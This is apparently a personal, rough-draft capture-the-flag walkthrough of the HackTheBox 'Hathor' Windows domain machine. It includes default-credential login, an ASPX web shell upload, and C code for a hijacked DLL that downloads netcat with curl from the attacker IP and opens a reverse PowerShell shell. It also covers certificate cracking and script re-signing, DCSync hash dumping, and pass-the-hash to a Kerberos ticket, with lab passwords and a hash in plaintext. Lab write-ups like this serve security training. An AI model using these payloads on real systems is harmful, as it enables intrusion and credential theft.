@@ -1,0 +1,445 @@
+so when we do our nmap scan on the machine using 
+
+result=$(nmap -p- --min-rate=1000 -Pn  -T4 10.10.11.147  | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed 's/,$//' | tr -d '%');nmap -p$result -Pn -sC -sV 10.10.11.147  -oA hathor
+
+nmap -p$result -Pn -sC -sV 10.10.11.147 -oA hathor 
+
+
+it gives us: 
+
+# Nmap 7.94 scan initiated Fri Jul 21 09:57:13 2023 as: nmap -p53,80,135,139,389,445,464,3269,5985,49664,49668,49695,49699 -Pn -sC -sV -oA hathor 10.10.11.147
+Nmap scan report for 10.10.11.147
+Host is up (0.66s latency).
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+| http-robots.txt: 29 disallowed entries (15 shown)
+| /CaptchaImage.ashx* /Admin/ /App_Browsers/ /App_Code/ 
+| /App_Data/ /App_Themes/ /bin/ /Blog/ViewCategory.aspx$ 
+| /Blog/ViewArchive.aspx$ /Data/SiteImages/emoticons /MyPage.aspx 
+|_/MyPage.aspx$ /MyPage.aspx* /NeatHtml/ /NeatUpload/
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Home - mojoPortal
+|_http-server-header: Microsoft-IIS/10.0
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=hathor.windcorp.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:hathor.windcorp.htb
+| Not valid before: 2022-03-18T07:51:40
+|_Not valid after:  2023-03-18T07:51:40
+|_ssl-date: 2023-07-21T06:59:16+00:00; 0s from scanner time.
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: windcorp.htb0., Site: Default-First-Site-Name)
+|_ssl-date: 2023-07-21T06:59:14+00:00; -1s from scanner time.
+| ssl-cert: Subject: commonName=hathor.windcorp.htb
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:hathor.windcorp.htb
+| Not valid before: 2022-03-18T07:51:40
+|_Not valid after:  2023-03-18T07:51:40
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+49695/tcp open  msrpc         Microsoft Windows RPC
+49699/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: HATHOR; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time: 
+|   date: 2023-07-21T06:58:48
+|_  start_date: N/A
+| smb2-security-mode: 
+|   3:1:1: 
+|_    Message signing enabled and required
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Fri Jul 21 09:59:19 2023 -- 1 IP address (1 host up) scanned in 125.89 seconds
+
+
+so we see that windcorp.htb is the domain and we also see that the ip addr 10.10.11.147 resolves to hathor.windcorp.htb 
+
+so we add it to our /etc/hosts file and we begin by enumerating port 80... we open the page in our browser and begin enumerating... on using the normal default creds that we are used to admin:admin and admin:password we don't get access so we try to look for other means of getting access to the machine but smbclient and rpcclient does not reap anything valueble maybe NTLM authentication is disabled... so we go back to the port 80 and we start by enumerating what CMS by checking the page source and we find the Content Management System(CMS) is Mojoportal... so we check online to see what the default credentials of the mojoportal cms might be and we find the credentials as:
+
+
+Email:admin@admin.com
+Password:admin 
+
+so using these and  we are able to login so we  continue our enumeration.... so when we check for known vulnerabilities we don't get any of them... that will actually work on the CMS Mojoportal  since the version we are using is currently up to date....  and the vulnerabilities are old for the CMS so as we snoop around we find out that this CMS actually has a file manager and to top it off this is an IIS server so we know that an aspx payload would work to bring us a reverse shell... now we begin by trying to avoid the filters in place because 
+
+so we use insomnia shell to do this for us  and after uploading the shell with the name insomnia_shell.aspx.txt we then rename the shell to insomnia_shell.aspx and change the destination... to a certain useful destination... then after checking the page source we see that 
+/Data/Sites/1/media/logos/windcorp.png is a source of an image so using this we are able to know where we are gonna execute the aspx shell to... so since I had put the file in the logos directory... I execute the url hathor.windcorp.htb/Data/Sites/1/media/logos/insomnia_shell.aspx.... and we actually get the web shell... so I put the Ip and port im listening to on my attacker machine then I get a shell once I execute...
+
+
+
+so we begin manual enumeration from the root directory first before we emplore the usage of another tool like winPEASx64.exe 
+
+or lets see what happens if we try to upload it.... we fail to upload it... theres definitely a protection mechanism put in place so we can not upload... so we check to see if constrained language mode is enabled using 
+
+
+*****ADD****** $ExecutionContext.SessionState.LanguageMode
+
+and after checking we find that yes... it is actually enabled
+
+this also means that applocker is enabled... so we check applocker's policies... using the command 
+
+get-applockerPolicies -effective -xml 
+
+we get the output of the policies in xml format.... so we copy it and paste it to a blank document having an .xml format... this document will be executed via the web-browser(firefox) so that we can begin our enumeration....
+
+
+cd C:\inetpub\wwwroot\Data\sites\1\media\logos
+rename-item -path "accesschk64.txt" -newname "accesschk64.exe"
+.\accesschk64.exe -w -s -q -u Users "C:\Windows" >> windows.txt -accepteula
+type windows.txt
+
+so we change directory to the place where the files uploaded through the CMS are stored... and we rename the file back to its original form then using the sysinternals tool we check the directories where we have permissions to 
+
+Accesschk v6.15 - Reports effective permissions for securable objects
+Copyright (C) 2006-2022 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+RW C:\Windows\Temp
+RW C:\Windows\tracing
+RW C:\Windows\Registration\CRMLog
+RW C:\Windows\System32\Microsoft\Crypto\DSS\MachineKeys
+RW C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
+RW C:\Windows\System32\spool\drivers\color
+RW C:\Windows\Temp\silconfig.log
+RW C:\Windows\Temp\vmware-vmtoolsd-GinaWild.log
+RW C:\Windows\Temp\vmware-vmusr-GinaWild.log
+PS C:\inetpub\wwwroot\Data\sites\1\media> cd C:\Get-bADpasswords\Accessible\CSVs
+cd C:\Get-bADpasswords\Accessible\CSVs
+
+
+so apparently the directories we have access to have been flagged by the applocker so we can't do much with this... so we do an enumeration and we find the Get-bADpasswords inside the directory apparently there was a leaked hash in there... we try to authenticate using the leaked hash via crackmapexec but it doesn't work... looks like NTLM authentication is disabled so we can't do that apparently... so we crack that leaked hash using crack station and we are able to retrieve the password as  !!!!ilovegood17
+
+now using this valid credentials we can use kerberos authentication since ntlm authentication has not been enabled... 
+so in order for us to set up everything well we edit the /etc/krb5.conf 
+these were my default  setting before I changed them:
+
+# The following libdefaults parameters are only for Heimdal Kerberos.
+	fcc-mit-ticketflags = true
+
+[realms]
+	ATHENA.MIT.EDU = {
+		kdc = kerberos.mit.edu
+		kdc = kerberos-1.mit.edu
+		kdc = kerberos-2.mit.edu:88
+		admin_server = kerberos.mit.edu
+		default_domain = mit.edu
+	}
+	ZONE.MIT.EDU = {
+		kdc = casio.mit.edu
+		kdc = seiko.mit.edu
+		admin_server = casio.mit.edu
+	}
+	CSAIL.MIT.EDU = {
+		admin_server = kerberos.csail.mit.edu
+		default_domain = csail.mit.edu
+	}
+	IHTFP.ORG = {
+		kdc = kerberos.ihtfp.org
+		admin_server = kerberos.ihtfp.org
+	}
+	1TS.ORG = {
+		kdc = kerberos.1ts.org
+		admin_server = kerberos.1ts.org
+	}
+	ANDREW.CMU.EDU = {
+		admin_server = kerberos.andrew.cmu.edu
+		default_domain = andrew.cmu.edu
+	}
+        CS.CMU.EDU = {
+                kdc = kerberos-1.srv.cs.cmu.edu
+                kdc = kerberos-2.srv.cs.cmu.edu
+                kdc = kerberos-3.srv.cs.cmu.edu
+                admin_server = kerberos.cs.cmu.edu
+        }
+	DEMENTIA.ORG = {
+		kdc = kerberos.dementix.org
+		kdc = kerberos2.dementix.org
+		admin_server = kerberos.dementix.org
+	}
+	stanford.edu = {
+		kdc = krb5auth1.stanford.edu
+		kdc = krb5auth2.stanford.edu
+		kdc = krb5auth3.stanford.edu
+		master_kdc = krb5auth1.stanford.edu
+		admin_server = krb5-admin.stanford.edu
+		default_domain = stanford.edu
+	}
+        UTORONTO.CA = {
+                kdc = kerberos1.utoronto.ca
+                kdc = kerberos2.utoronto.ca
+                kdc = kerberos3.utoronto.ca
+                admin_server = kerberos1.utoronto.ca
+                default_domain = utoronto.ca
+	}
+
+[domain_realm]
+	.mit.edu = ATHENA.MIT.EDU
+	mit.edu = ATHENA.MIT.EDU
+	.media.mit.edu = MEDIA-LAB.MIT.EDU
+	media.mit.edu = MEDIA-LAB.MIT.EDU
+	.csail.mit.edu = CSAIL.MIT.EDU
+	csail.mit.edu = CSAIL.MIT.EDU
+	.whoi.edu = ATHENA.MIT.EDU
+	whoi.edu = ATHENA.MIT.EDU
+	.stanford.edu = stanford.edu
+	.slac.stanford.edu = SLAC.STANFORD.EDU
+        .toronto.edu = UTORONTO.CA
+        .utoronto.ca = UTORONTO.CA
+
+
+now after I change the settings here its how it looks:
+
+
+[libdefaults]
+	default_realm = WINDCORP.HTB
+
+# The following krb5.conf variables are only for MIT Kerberos.
+	kdc_timesync = 1
+	ccache_type = 4
+	forwardable = true
+	proxiable = true
+        rdns = false
+
+
+# The following libdefaults parameters are only for Heimdal Kerberos.
+	fcc-mit-ticketflags = true
+
+[realms]
+	ATHENA.MIT.EDU = {
+		kdc = hathor.windcorp.htb
+		kdc = hathor.windcorp.htb
+		kdc = hathor.windcorp.htb
+		admin_server = hathor.windcorp.htb
+		default_domain = mit.edu 
+	}
+	ZONE.MIT.EDU = {
+		kdc = casio.mit.edu
+		kdc = seiko.mit.edu
+		admin_server = casio.mit.edu
+	}
+	CSAIL.MIT.EDU = {
+		admin_server = kerberos.csail.mit.edu
+		default_domain = csail.mit.edu
+	}
+	IHTFP.ORG = {
+		kdc = kerberos.ihtfp.org
+		admin_server = kerberos.ihtfp.org
+	}
+	1TS.ORG = {
+		kdc = kerberos.1ts.org
+		admin_server = kerberos.1ts.org
+	}
+	ANDREW.CMU.EDU = {
+		admin_server = kerberos.andrew.cmu.edu
+		default_domain = andrew.cmu.edu
+	}
+        CS.CMU.EDU = {
+                kdc = kerberos-1.srv.cs.cmu.edu
+                kdc = kerberos-2.srv.cs.cmu.edu
+                kdc = kerberos-3.srv.cs.cmu.edu
+                admin_server = kerberos.cs.cmu.edu
+        }
+	DEMENTIA.ORG = {
+		kdc = kerberos.dementix.org
+		kdc = kerberos2.dementix.org
+		admin_server = kerberos.dementix.org
+	}
+	stanford.edu = {
+		kdc = krb5auth1.stanford.edu
+		kdc = krb5auth2.stanford.edu
+		kdc = krb5auth3.stanford.edu
+		master_kdc = krb5auth1.stanford.edu
+		admin_server = krb5-admin.stanford.edu
+		default_domain = stanford.edu
+	}
+        UTORONTO.CA = {
+                kdc = kerberos1.utoronto.ca
+                kdc = kerberos2.utoronto.ca
+                kdc = kerberos3.utoronto.ca
+                admin_server = kerberos1.utoronto.ca
+                default_domain = utoronto.ca
+	}
+
+[domain_realm]
+	.mit.edu = ATHENA.MIT.EDU
+	mit.edu = ATHENA.MIT.EDU
+	.media.mit.edu = MEDIA-LAB.MIT.EDU
+	media.mit.edu = MEDIA-LAB.MIT.EDU
+	.csail.mit.edu = CSAIL.MIT.EDU
+	csail.mit.edu = CSAIL.MIT.EDU
+	.whoi.edu = ATHENA.MIT.EDU
+	whoi.edu = ATHENA.MIT.EDU
+	.stanford.edu = stanford.edu
+	.slac.stanford.edu = SLAC.STANFORD.EDU
+        .toronto.edu = UTORONTO.CA
+        .utoronto.ca = UTORONTO.CA
+
+
+so now that we have a valid TGT we authenticate normally on normal services like smb... using smbclient we get that the files available there are BgInfo tool from sysinternals and the autoit scripting framework...
+
+our next step is to check whether either bginfo or the autoit script is executed on the machine.... to do this we create a batch script that checks for periodic  execution... it checks after every 5 seconds and appendsthe results in the tasks.txt file
+
+so we create this batch script.. the code is as follows:
+
+:start
+tasklist /FI "imagename eq Bginfo*" >> C:\Windows\Temp\tasks.txt
+ping -n 5 127.1 > NUL
+tasklist /FI "imagename eq Autoit*" >> C:\Windows\Temp\tasks.txt
+ping -n 5 127.1 > NUL
+GOTO start
+
+
+cd C:\inetpub\wwwroot\Data\sites\1\media\logos
+rename-item -path "task.txt" -newname "task.cmd"
+move-item -path task.cmd -destination C:\Windows\temp\
+cd C:\Windows\Temp
+.\task.cmd
+
+and we upload it through the filesystem upload vulnerability that we had obtained... 
+
+we execute it... it runs... then we abandon the shell we currently have and open another shell... 
+
+
+where we check the results in the tasks.txt file and find that its true... the Bginfo and the autoit app run periodically... so it might be possible that we can modify the apps... through smbclient... but unfortunately noo... it denies us  the privilege to modify it even  though the file executes periodically... but on checking other files in the share we see that there is  a possibility of modifying the 7-zip64.dll that exists in the script folder..
+
+because when we get and put the  file back to its location... it does not give us any errors showing that we have perfectly modified the .dll file...
+
+on checking the other scripts in the scripts folder.. it shows that they work hand in hand with the dll... 
+
+So this attack is called DllInjection...
+
+so our code that is meant to modify the dll we saw is:
+
+#include <stdlib.h>
+#include <windows.h>
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID IpReserved)
+{
+	switch (ul_reason_for_call)
+	{
+	case DLL_PROCESS_ATTACH:
+	system("cmd.exe /c ping  10.10.16.4");
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+    break;
+	}
+	return TRUE;
+}
+
+but this is just a test because we will just be testing to see if it pings back to our machine... we will use tcpdump to check if the machine is reaching out to us.... and yes it is reaching to us so we continue to establish a  reverse shell... but before that it would be wiser to enumerate the firewall rules first...
+
+reg query HKLM\Software\Policies\Microsoft\WindowsFirewall\FirewallRules
+
+Get-NetFirewallRule -PolicyStore ActiveStore | Where-Object { $_.Action -eq "Block" } 
+---->with this command we get the apps and services that have been blocked
+
+
+this command enumerates the firewall rules... we enumerate the rules first then we plan accordingly... 
+
+and we find that AutoIt is in the blocklist so we enumerate further in the environment where the dll gets executed 
+
+
+
+#include <stdlib.h>
+#include <windows.h>
+BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID IpReserved)
+{
+	switch (ul_reason_for_call)
+	{
+	case DLL_PROCESS_ATTACH:
+	system("cmd.exe  /c takedown /F c:\\share\\Bginfo64.exe");
+	system("cmd.exe /c calcs c:\\share\\Bginfo64.exe  /E /G ginawild:F");
+	
+	system("cmd.exe /c copy C:\\inetpub\\wwwroot\\data\\sites\\1\\media\\nc.exe C:\\share\\Bginfo64.exe");
+    system("cmd.exe  /c c:\\share\\Bginfo64.exe  -e powershell 10.10.16.4 9001");
+    
+
+    case DLL_THREAD_ATTACH:
+    case DLL_THREAD_DETACH:
+    case DLL_PROCESS_DETACH:
+    break;
+	}
+	return TRUE;
+}
+
+
+#include <windows.h>
+BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
+    switch(dwReason){
+        case DLL_PROCESS_ATTACH:
+        	system("cmd.exe /c takeown /F C:\\share\\Bginfo64.exe");
+            system("cmd.exe /c cacls C:\\share\\Bginfo64.exe /E /G ginawild:F");
+            system("cmd.exe /c C:\\share\\Bginfo64.exe -accepteula");            
+            system("curl 10.10.16.2:80/nc64.exe -o C:\\share\\Bginfo64.exe");
+            system("C:\\share\\Bginfo64.exe -e powershell 10.10.16.2 7777");
+            system("cmd.exe /c ping 10.10.16.2");
+            break;
+        case DLL_PROCESS_DETACH:
+            break;
+        case DLL_THREAD_ATTACH:
+            break;
+        case DLL_THREAD_DETACH:
+            break;
+    }
+    return TRUE;
+}
+
+enter into cmd then 
+execute 
+start shell:RecycleBinFolder
+and 
+C:\> dir /s/a <driveletter>:\$Recycle.Bin --->to view the file 
+
+crackpkcs12 -d /usr/share/wordlists/rockyou.txt cert.pfx
+
+Dictionary attack - Starting 4 threads
+
+*********************************************************
+Dictionary attack - Thread 1 - Password found: abceasyas123
+*********************************************************
+
+
+
+Get-AuthenticodeSignature .\Get-bADpasswords.ps1
+
+
+Start-Process -FilePath "C:\Share\Bginfo64.exe" -ArgumentList "10.10.14.29 8888 -e powershell.exe"
+
+signing with powershell script(works for non-constrained language mode)
+$CertPath ="C:\Get-bADpasswords\cert.pfx"
+$CertPass = "abceasyas123"
+$Cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2($CertPath, $CertPass)
+Set-AuthenticodeSignature -Certificate $Cert -FilePath C:\Get-bADpasswords\Get-bADpasswords.ps1
+
+1st
+"Start-Process -FilePath 'C:\Share\Bginfo64.exe' -ArgumentList '10.10.14.29 8888 -e powershell.exe'" | Out-File -FilePath "C:\Get-bADpasswords\Get-bADpasswords.ps1" -Encoding utf8
+
+2nd
+c:\inetpub\wwwroot\data\sites\1\media\logos\signtool.exe sign /f c:\users\ginawild\cert.pfx /p abceasyas123 c:\Get-bADpasswords\Get-bADpasswords.ps1
+
+3rd
+.\run.vbs
+
+
+check the reel machine from htb active directory labs(obtaining plain text passwords from hashes)
+
+and also the user bpassrunner had dcsync rights so by just using 
+
+Get-ADReplAccount -SamAccountName Administrator -Server 'hathor.windcorp.htb' command we are able to dump all user passwords including the administrators...  the dude was also part of the account operators group...
+
+
+failed... went for impacket to make  a tgt
+
+
+
+python3 /home/isayar17_x401a/OSCP/HTB/support/impacket/examples/getTGT.py windcorp.htb/Administrator -hashes :b3ff8d7532eef396a5347ed33933030f
+KRB5CCNAME=./Administrator.ccache klist
+KRB5CCNAME=./Administrator.ccache evil-winrm -i hathor.windcorp.htb -r WINDCORP.HTB
